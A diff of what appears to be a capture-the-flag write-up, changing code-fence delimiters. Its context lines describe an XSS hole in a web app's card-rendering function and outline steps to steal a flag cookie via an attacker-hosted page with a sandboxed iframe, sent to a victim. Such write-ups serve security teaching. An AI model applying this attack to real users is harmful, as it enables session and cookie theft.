@@ -5,7 +5,7 @@ Observation on the application:
 - Flag cookie is set to SameSite=Strict that means we can't access it from another domain, even from an iframe.
 - The application is vulnerable to XSS in this code:
 
-'''
+'
 
     function createWaifuCardHTML(file, buttonText, buttonAction) {
         const sanitizedFile = DOMPurify.sanitize(file);
@@ -13,11 +13,11 @@ Observation on the application:
         const buttonHTML = `<button class="btn btn-outline-light" onclick="${buttonAction}('${sanitizedFile}')">${buttonText}</button>`;
         return `<div class="card text-center waifu-item">${imgHTML}<div class="btn-container">${buttonHTML}</div></div>`;
     }
-'''
+'
 
 - But we can't directly exploit it because there's some restriction here:
 
-'''
+'
 
     function displayClaimedWaifus(paths) {
         if (REGEX_SAVE_PROPS.test(initialHash)) {
@@ -34,13 +34,13 @@ Observation on the application:
     }
     ...snip...
     
-'''
+'
 
 Here the step to get xss and steal the flag
 
 1. Create a page that contains the following code:
 
-'''html
+'
 
     <body></body>
     <script>
@@ -75,7 +75,7 @@ Here the step to get xss and steal the flag
     i1.sandbox = 'allow-scripts allow-same-origin allow-popups'
     document.body.appendChild(i1)
     </script>
-'''
+'
 
 2.Serve the page using a web server, make sure the server is accessible from the internet.
 3.Send the link to the victim.
